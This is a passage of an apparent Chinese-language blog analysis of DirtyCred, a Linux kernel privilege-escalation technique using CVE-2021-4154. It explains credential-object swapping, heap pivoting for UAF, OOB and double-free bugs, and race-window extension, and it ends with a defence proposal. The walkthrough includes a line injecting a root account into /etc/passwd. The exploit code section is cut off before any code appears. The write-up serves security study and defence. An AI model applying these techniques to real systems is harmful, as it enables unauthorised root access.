class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/fs.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> &#123;</span><br> ...<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">path</span>    <span class="hljs-title">f_path</span>;</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span>        *<span class="hljs-title">f_inode</span>;</span>   <span class="hljs-comment">/* cached value */</span><br> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span>    *<span class="hljs-title">f_op</span>;</span><br><br> <span class="hljs-comment">/*</span><br><span class="hljs-comment">  * Protects f_ep_links, f_flags.</span><br><span class="hljs-comment">  * Must not be taken from IRQ context.</span><br><span class="hljs-comment">  */</span><br> <span class="hljs-type">spinlock_t</span>          f_lock;<br> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">rw_hint</span>        <span class="hljs-title">f_write_hint</span>;</span><br> <span class="hljs-type">atomic_long_t</span>       f_count;<br> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        f_flags;<br> <span class="hljs-type">fmode_t</span>             f_mode;           <span class="hljs-comment">// !!: O_RDWR</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span>        <span class="hljs-title">f_pos_lock</span>;</span><br> <span class="hljs-type">loff_t</span>              f_pos;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fown_struct</span>  <span class="hljs-title">f_owner</span>;</span><br> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>   *<span class="hljs-title">f_cred</span>;</span>      <span class="hljs-comment">// !!: cred</span><br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_ra_state</span>   <span class="hljs-title">f_ra</span>;</span><br> ...<br>&#125;<br></code></pre></td></tr></table></figure></p></li></ol><p>在Linux中，每个进程都有一个指向<code>cred</code>对象的指针。<code>cred</code>对象中的UID字段表示进程权限，如<code>GLOBAL_ROOT_UID</code>表示任务具有root权限。当进程尝试访问资源时，内核会检查进程的<code>cred</code>对象中的UID，以确定是否授权访问。除了UID，<code>cred</code>对象还包含了细粒度的能力（capabilities），这些能力指定了进程可以执行的特定操作。例如，<code>CAP_NET_BIND_SERVICE</code>能力允许进程将套接字绑定到Internet域的特权端口上。在Linux内核中，每个文件都与一个<code>inode</code>对象关联，该对象链接到凭证，以控制对文件的访问。当进程打开文件时，内核会检查<code>inode</code>及其权限，并在授权访问后，将凭证从<code>inode</code>对象转移到<code>file</code>对象。<code>file</code>对象不仅维护凭证，还包含文件的读写权限，通过这些机制，内核可以确保进程不会向只读模式打开的文件写入数据。</p><p>在Linux内核中，每个文件都有其所有者的UID和GID以及其他用户的访问权限和能力。对于可执行文件，它们还具有SUID/SGID标志，指示允许其他用户以所有者的特权运行的特殊权限。在Linux内核实现中，每个文件都绑定到一个链接到凭证的<code>inode</code>对象。当一个进程试图打开一个文件时，内核调用函数<code>inode_permission</code>会在授予文件访问权之前检查<code>inode</code>和相应的权限。打开文件后，内核断开与<code>inode</code>对象的凭据链接并将它们附加到<code>file</code>对象。除了维护凭证之外，<code>file</code>对象还包含文件的读/写权限。通过<code>file</code>对象，内核可以索引到<code>cred</code>对象，从而检查特权。此外，它还可以检查读写权限，从而确保进程不会向以只读模式打开的文件写入数据。</p><h2 id="kernel-heap-memory-management">Kernel Heap MemoryManagement</h2><p>Linux内核使用slab内存分配器来管理内存分配以提高性能和防止碎片化。尽管Linux内核中存在三种不同的内存分配器（SLOB，SLAB，SLUB），它们共享一个相同的设计理念。具体来说，这些分配器都依赖于缓存机制来管理大小相同的内存块。对于每个缓存，内核会分配内存页，并将其划分为多个大小相同的块，每个块用于承载特定类型的对象。当一个缓存中的内存页被完全占用时，内核会为该缓存分配新的内存页。如果一个缓存中的内存页不再被需要，即其上的所有对象都已被释放，那么内核会回收这些内存页。</p><p>Linux内核主要包含两种类型的缓存：</p><h3 id="generic-caches">Generic Caches</h3><p>Linux内核提供了多种通用缓存，用于分配不同大小的内存块。当请求内存分配时，内核首先将请求的大小四舍五入到最接近的大小，然后从匹配大小的缓存中分配内存块。如果分配请求没有明确指定从哪种类型的缓存中进行分配，则默认在通用缓存中进行。相同通用缓存中的分配请求可以共享相同的内存页，因为它们被维护在同一内存页上。</p><h3 id="dedicated-caches">Dedicated Caches</h3><p>为了提高性能和安全性，Linux内核创建了专用缓存。一些频繁使用的对象会拥有自己的专用缓存，这可以减少分配这些对象的时间，从而提高系统性能。专用缓存和通用缓存不共享内存页，因此在通用缓存中分配的对象不会与专用缓存中的对象相邻。这可以看作是一种缓存级的隔离，有助于减轻通用缓存中的溢出对系统的影响。</p><p>可以通过在终端中输入<code>sudo cat /proc/slabinfo</code>命令查看slab分配器的详细信息。其中列出的不同名称的内存块即表示专用缓存，名称中包含<code>kmalloc</code>的则表示通用缓存。</p><h1 id="threat-model">Threat Model</h1><p>假设一个低权限用户拥有对Linux系统的本地访问权限，并试图通过利用内核中的内存破坏漏洞来实现本地提权。我们还假设Linux系统启用了内核版本5.15中提供的所有攻击缓解措施和内核保护机制。这些机制包括<ahref="https://lwn.net/Articles/569635/">KASLR</a>, <ahref="https://lwn.net/Articles/517475/">SMAP</a>, <ahref="https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/">SMEP</a>,<a href="https://lwn.net/Articles/810077/">CFI</a>, <ahref="https://lwn.net/Articles/741878/">KPTI</a>等。在这种情况下，内核地址空间是随机化的，内核执行期间不能直接访问用户空间内存，且其控制流完整性得到保证。</p><h1 id="dirtycred利用">DirtyCred利用</h1><p>以CVE-2021-4154为例，演示了DirtyCred如何被实际利用。</p><p>CVE-2021-4154是由于类型混淆错误导致，其中文件对象被<code>fs_context</code>结构体中的指针错误引用。在Linux内核中，文件对象的生命周期是通过引用计数机制维护的。当引用计数降至零时，文件对象会被自动释放，这意味着该对象不再被使用。然而，通过触发此漏洞，即使文件对象仍在使用中，内核也会错误地释放它。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221007220556314.png" /></p><p>如上图所示，DirtyCred首先打开一个可写文件<code>/tmp/x</code>，这会在内核中分配一个可写文件对象。通过触发漏洞，结构体中的指针被改为指向对应缓存中的文件对象。接着，DirtyCred尝试向打开的文件<code>/tmp/x</code>写入内容。在实际写入内容之前，Linux内核会检查当前文件是否有写权限、位置是否可写等。通过这些内核检查后，DirtyCred继续执行文件写入操作，并进入下一步。在这一步中，DirtyCred通过触发<code>fs_context</code>的释放操作来释放文件对象，使得该文件对象成为一个已释放的内存块。然后，在第三步中，DirtyCred打开一个只读文件<code>/etc/passwd</code>，这导致内核为<code>/etc/passwd</code>分配一个文件对象。如图所示，新分配的文件对象被放置在之前释放的内存块中。此后，DirtyCred继续之前的写操作，内核将执行实际的内容写入。由于文件对象已经被交换，所以原本要写入的内容现在将重定向到只读文件<code>/etc/passwd</code>中。如果写入<code>/etc/passwd</code>的内容是<code>hacker:x:0:0:root:/:/bin/sh</code>，那么攻击者可以通过这种方式注入一个root账户，从而实现提权。</p><p>简而言之，攻击者在权限检查和数据写入之间进行竞争。在成功检查文件权限（<code>/tmp/x</code><strong>可写</strong>）之后，触发漏洞恶意释放原先的<code>credential</code>结构体（这里是<code>file</code>结构体），并创建<strong>高权限</strong>的<code>credential</code>结构体（例如<code>/etc/passwd</code>的<code>file</code>结构体）来占据这个内存块，使得待写入的数据被写入<code>/etc/passwd</code>中，造成本地提权。</p><p>漏洞修补：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c</span><br><span class="hljs-comment">index ee93b6e895874..527917c0b30be 100644</span><br><span class="hljs-comment">--- a/kernel/cgroup/cgroup-v1.c</span><br><span class="hljs-comment">+++ b/kernel/cgroup/cgroup-v1.c</span><br><span class="hljs-meta">@@ -912,6 +912,8 @@</span> int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)<br>    opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br>    if (opt == -ENOPARAM) &#123;<br>        if (strcmp(param-&gt;key, &quot;source&quot;) == 0) &#123;<br><span class="hljs-addition">+            if (param-&gt;type != fs_value_is_string)</span><br><span class="hljs-addition">+                return invalf(fc, &quot;Non-string source&quot;);</span><br>            if (fc-&gt;source)<br>                return invalf(fc, &quot;Multiple sources not supported&quot;);<br>            fc-&gt;source = param-&gt;string;<br></code></pre></td></tr></table></figure><p>如上所示，DirtyCred不仅限于利用<code>file</code>对象。攻击者也可以使用类似的技术来交换凭据（<code>cred</code>），从而实现提权。</p><p>依据CVE-2021-4154的利用案例，DirtyCred本身不修改控制流，而是利用内核的内存管理特性来操作内存中的对象。因此，许多旨在防止控制流篡改的现有防御措施对于DirtyCred的利用无效。尽管最近一些研究工作尝试通过重新设计内存管理机制（例如AUTOSLAB）来增强内核的防御，但它们仍然无法阻止DirtyCred的利用，因为这些新提出的内存管理方案仍然是粗粒度的，无法有效阻止所需的内存操作。</p><h1 id="技术挑战">技术挑战</h1><p>虽然上述示例展示了DirtyCred如何实现提权的过程，但在实际应用中还存在许多技术难题需要解决。</p><p>DirtyCred的核心在于能够非法释放一个低特权对象（如具有写权限的文件对象），并重新分配为一个高特权对象（例如，具有只读权限的文件对象）。然而，并不是所有内核漏洞都直接提供这样的能力。有的漏洞可能仅允许越界写入，而不支持直接对凭据对象进行非法释放。因此，对于不同类型的漏洞，DirtyCred需要设计不同的策略来进行利用。</p><p>在权限检查完成之后和文件对象交换之前，DirtyCred需要保证真实文件写入的有效性。但在Linux内核中，权限检查与实际内容的写入是并行进行的。若没有有效控制文件对象交换的具体时机的方案，利用的难度将大幅增加。因此，DirtyCred需要一系列的机制，确保在恰当的时间窗口内完成文件对象的交换。</p><p>其中一个关键挑战是如何使用高特权凭证替换掉低特权凭证。为此，DirtyCred在释放的内存块中分配高特权对象以接管该内存。但低权限用户分配高权限凭据并非易事。虽然简单地等待特权用户自行分配可能在某些情况下可行，但这种被动策略严重影响了利用的稳定性。首先，DirtyCred无法预知何时可以回收所需的内存块以继续利用；其次，新分配的对象可能并不具备所需的特权级别。因此，DirtyCred需要结合用户空间和内核空间的策略来解决这一问题。</p><h1 id="pivoting-vulnerability-capability">PIVOTING VULNERABILITYCAPABILITY</h1><p>以CVE-2021-4154为例，内核漏洞为DirtyCred提供了非法释放文件对象的能力。然而在实际中，其他内核漏洞可能没有这种直接能力。例如，double-free或use-after-free(UAF)漏洞可能不直接针对凭证对象。而一些越界访问(OOB)漏洞没有非法释放的能力。因此，DirtyCred需要调整其利用链以适应不同类型的漏洞。</p><h2 id="pivoting-oob-uaf-write">Pivoting OOB &amp; UAF Write</h2><p>对于具有内存覆盖能力的OOB或UAF漏洞，DirtyCred首先寻找在内存中相邻且包含指向cred对象指针的可利用结构体。接着，利用SLAKE或其他堆喷技术在覆盖发生的内存区域分配目标对象。如下图所示，为了利用OOB漏洞，目标结构体需要紧跟在可控对象之后。DirtyCred通过越界写修改结构体中包含的<code>cred</code>指针，具体而言，是将<code>cred</code>指针的低两个字节置零。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221007234651485.png" /></p><p>由于Linux内核中的内存是按页管理的，且内存页地址始终以0x1000字节对齐，新缓存分配的对象通常从内存页的起始位置开始。因此，通过覆写的零字节操作，使得指针指向内存页的起始处。例如，在图(b)中，将凭证对象引用的指针的最后两个字节置零后，该指针将指向另一个凭证对象所在的内存页的起始。这样，DirtyCred通过修改指针，获取到了新内存页第一个对象的非法引用。利用内核正常释放对象内存和保留野指针的特性，DirtyCred可以通过堆喷技术用高特权凭证对象占据释放的位置，实现提权。</p><ul><li>如果UAF发生在<code>credential dedicated cache</code>上，只需释放原有的<code>unprivileged credential</code>，并用新创建的<code>privileged credential</code>对象占据该内存块即可完成替换。</li><li>如果UAF发生在<code>generic cache</code>上（更常见的情况），则要求该UAF漏洞具有<code>invalid-write</code>的能力。即先释放一个内存块，利用带有<code>credential pointer</code>的可利用对象占据该内存块，再通过UAF野指针修改这个<code>credential pointer</code>。</li></ul><h2 id="pivoting-double-free">Pivoting Double Free</h2><p>Double Free漏洞的利用相对更为复杂：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404193234339.png" /></p><p>利用流程如下：</p><ol type="1"><li>在受影响对象所在的缓存中大量分配对象，使其释放时机可控且至少占用一个内存页。这样做的目的是让某个内存页的回收时机可控，因为如果该页上的所有对象都被释放，则该空闲页会被回收。</li><li>尝试触发两次doublefree漏洞，以在一个被释放的内存块上留下两个悬挂指针。</li><li>释放该受影响对象所在内存页上的所有对象，使该页被回收并用于<code>credential</code>的内存分配，成为专用缓存。</li><li>在这个现已成为<code>credential dedicated cache</code>的内存页上大量分配<code>credential</code>结构体，以占满该页内存。</li><li>注意到两个悬挂指针可能不与<code>credential object</code>对齐，需要利用其中一个悬挂指针来释放出一个<code>credential object</code>的内存块。</li><li>分配新的<code>credential object</code>来占据这个内存块，这样就实现了两个指针同时指向一个<code>credential object</code>，后续的利用可以参考UAF的方式。</li></ol><h1 id="延长竞争窗口">延长竞争窗口</h1><p>DirtyCred的核心挑战之一是在进行文件写权限检查和实际写入数据之间，成功地将低权限的credential替换为高权限credential。由于替换credential需要一定的时间，能够延长这个“竞争窗口”将大大提高漏洞利用的成功率。</p><p>在多线程程序中，<code>userfaultfd</code>允许一个线程管理其他线程产生的PageFault事件。当某线程触发PageFault时，它会立即进入休眠状态，而其他线程可以通过<code>userfaultfd</code>读取并处理这个PageFault事件。</p><p><code>userfaultfd</code>经常被用于条件竞争漏洞的利用中。为了防止<code>userfaultfd</code>在内核漏洞利用中被滥用，从内核5.11版本开始，非特权<code>userfaultfd</code>默认是禁用的（<ahref="https://lwn.net/Articles/819834/">LWN: Blocking userfaultfd()kernel-fault handling</a>）。</p><p>FUSE（Filesystem inUserspace）是一个用户层的文件系统框架，允许用户自定义文件系统。通过在该框架中注册handler来处理文件操作请求，可以在文件操作前执行handler来暂停内核执行，从而尽可能地延长时间窗口。</p><h2 id="userfaultfd利用方式">Userfaultfd利用方式</h2><p>在Linux 4.13版本之前，<code>writev</code>系统调用的实现如下所示：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404193738756.png" /></p><p>攻击者可以在权限检查完成后，在调用<code>import_iovec</code>时触发缺页错误，利用<code>userfaultfd</code>机制暂停内核执行。</p><p>但是，在Linux4.13版本后，<code>import_iovec</code>函数调用被提前，如下所示：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/0.png" /></p><p>如果有进程对某个文件执行了超大量数据写入，那么另一个进程在对相同文件执行写操作时，将会等待<code>inode</code>锁的释放。实验表明，4GB数据的写入可以使后续进程等待数十秒（依赖于硬盘性能），因此这个<code>inode</code>锁也可以用来延长竞争窗口。</p><h1 id="分配特权对象">分配特权对象</h1><p>由于DirtyCred极度需要控制特权credential对象的分配时机，如何控制这些对象的分配成为了关键。</p><p><strong>在用户层面</strong>，可以通过以下方法来分配特权credential：</p><ol type="1"><li>大量执行Set-UID程序（如<code>sudo</code>），或频繁创建特权级守护进程（如<code>sshd</code>），以此来创建特权credential结构体。</li><li>使用ReadOnly方式打开如<code>/etc/passwd</code>这类特权文件。</li></ol><p><strong>在内核层面</strong>，当内核创建新的kernelthread时，当前的kernelthread及其特权credential结构体会被复制。因此，只要找到稳定创建kernelthread的方法，DirtyCred就能稳定地创建特权credential结构体。实现这一目标的方法包括：</p><ol type="1"><li>向kernel workqueue中填充大量任务，动态创建新的kernelthread来执行这些任务。</li><li>调用usermodehelper（一种允许内核创建用户模式进程的机制）。最常见的应用场景是加载内核模块到内核空间中。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// kernel/kmod.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">call_modprobe</span><span class="hljs-params">(<span class="hljs-type">char</span> *module_name, <span class="hljs-type">int</span> wait)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">subprocess_info</span> *<span class="hljs-title">info</span>;</span><br> <span class="hljs-type">static</span> <span class="hljs-type">char</span> *envp[] = &#123;<br>     <span class="hljs-string">&quot;HOME=/&quot;</span>,<br>     <span class="hljs-string">&quot;TERM=linux&quot;</span>,<br>     <span class="hljs-string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,<br>     <span class="hljs-literal">NULL</span><br> &#125;;<br><br> <span class="hljs-type">char</span> **argv = kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span> *[<span class="hljs-number">5</span>]), GFP_KERNEL);<br> <span class="hljs-keyword">if</span> (!argv)<br>     <span class="hljs-keyword">goto</span> out;<br><br> module_name = kstrdup(module_name, GFP_KERNEL);<br> <span class="hljs-keyword">if</span> (!module_name)<br>     <span class="hljs-keyword">goto</span> free_argv;<br><br> argv[<span class="hljs-number">0</span>] = modprobe_path;<br> argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-q&quot;</span>;<br> argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;--&quot;</span>;<br> argv[<span class="hljs-number">3</span>] = module_name;  <span class="hljs-comment">/* 注意 free_modprobe_argv() */</span><br> argv[<span class="hljs-number">4</span>] = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// 调用usermode helper</span><br> info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,<br>                <span class="hljs-literal">NULL</span>, free_modprobe_argv, <span class="hljs-literal">NULL</span>);<br> <span class="hljs-keyword">if</span> (!info)<br>     <span class="hljs-keyword">goto</span> free_module_name;<br><br> <span class="hljs-keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);<br><br>free_module_name:<br> kfree(module_name);<br>free_argv:<br> kfree(argv);<br>out:<br> <span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br></code></pre></td></tr></table></figure><p>内核在<strong>加载内核模块</strong>时，会<strong>在内核层执行modprobe程序</strong>，以<strong>搜索标准安装路径下的目标驱动</strong>。</p><h1 id="evaluation">EVALUATION</h1><h2 id="可利用的内核对象">可利用的内核对象</h2><p>在Linux5.16.15版本中，DirtyCred利用的前提是<strong>内核对象中必须包含credential对象</strong>，且<strong>可以控制这些对象在内核堆上的分配时机</strong>。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404194225406.png" /></p><p>分析结果如下：</p><ol type="1"><li>几乎每个generic cache都<strong>至少有两个</strong>可利用对象。</li><li>各个可利用对象中credential的偏移量差异较大，这为DirtyCred的利用成功率提供了提升的可能性。<ul><li>特别是对于OOB（越界写）漏洞，可覆写的偏移量可能相差甚远。</li></ul></li><li>有五个可利用对象的credential相对偏移量为0，这意味着在内存破坏范围较小的情况下，DirtyCred的利用成功率会更高。</li></ol><h2 id="满足评估条件的cve漏洞">满足评估条件的CVE漏洞</h2><p>评估标准包括：</p><ul><li>报告时间为2019年及以后的Linux内核漏洞。</li><li>能够在Linux堆上进行堆破坏。</li><li>触发条件不需要特定硬件支持。</li><li>能复现相应内核panic。</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240404194320812.png" /></p><p>从上图可见，在所有缓解机制都启动的情况下，DirtyCred的利用成功率为：<strong>16/24</strong>。其中：</p><ol type="1"><li>Double Free漏洞的利用成功率最高。</li><li>OOB漏洞中，有些案例因为OOBwrite发生在虚拟内存而非kmalloc分配的内存，因此不可利用。</li><li>UAF漏洞中，一些无法完成利用的案例是因为仅能进行UAFread，无法执行invalid-write；或者虽然可以执行invalid-write，但写入位置不在可利用对象的credential字段上。</li></ol><h1 id="dirty-cred防护">Dirty Cred防护</h1><p>DirtyCred之所以能成功利用，核心原因在于内核的内存隔离是基于<strong>类型</strong>而非<strong>权限</strong>。</p><p>防护方法相对简单：将privileged credentials与其他unprivilegedcredentials隔离。</p><p>实现方式是使用<code>vzalloc/kvfree</code>函数在虚拟内存中创建与释放privilegedcredentials内存，从而实现privileged和unprivileged对象在memorycache中的隔离。</p><p>选择虚拟内存的原因：</p><ol type="1"><li>如果使用两个不同的kmalloc分配的memorycache，存在通过Linux内核重用机制将privileged和unprivileged所在页合并的风险，导致隔离失效。</li><li>虚拟内存区域内的内存是内核<strong>动态分配</strong>、<strong>虚拟连续</strong>的，位于VMALLOC_START至VMALLOC_END区域内，不会与直接映射的内存区域重叠。</li></ol><p>需要隔离的credential结构体包括：</p><ol type="1"><li>UID为<strong>GLOBAL_ROOT_UID</strong>的struct cred（privilegedcredentials）。</li><li>打开方式中带有<strong>可写</strong>权限的struct file（unprivilegedcredentials）。</li></ol><p>为何需要隔离这两种类型的结构体，是因为相比其他结构（非特权级UID或只读文件结构），它们的创建次数相对较少。</p><p>隔离在credential创建时就已确定，如果非特权cred结构体被原地提权（如通过<code>setuid/cap_setuid</code>），则内存隔离策略可能失效。因此，提出在<code>alter_cred_subscribers</code>函数执行时，在虚拟内存区域创建新的特权cred，而非原地修改。但这种防护策略的有效性可能取决于Linux未来的发展，如果开发出新的原地修改cred的方式，则此防护可能会失效，因此留待未来进一步研究。</p><h1 id="cve-2021-4154利用">CVE-2021-4154利用</h1><p>在线程1中打开一个执行“慢写”的可写文件，将大量数据写入文件。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png" /></p><p>此时在线程2中打开同一个文件准备进行写入恶意数据，通过权限检查后触发锁等待线程1</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.jpg" /></p><p>线程3触发UAF:此时文件还在使用，但引用数被置0，导致文件对象被free。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.jpg" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" /></p><p>疯狂打开<code>/etc/passwd</code>等待特权文件结构替换释放的文件结构</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" /></p><p>线程2等待线程1解锁后，向特权文件写入恶意数据</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.jpg" /></p><p>攻击成功</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/DirtyCred%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" /></p><h1 id="exp">exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span 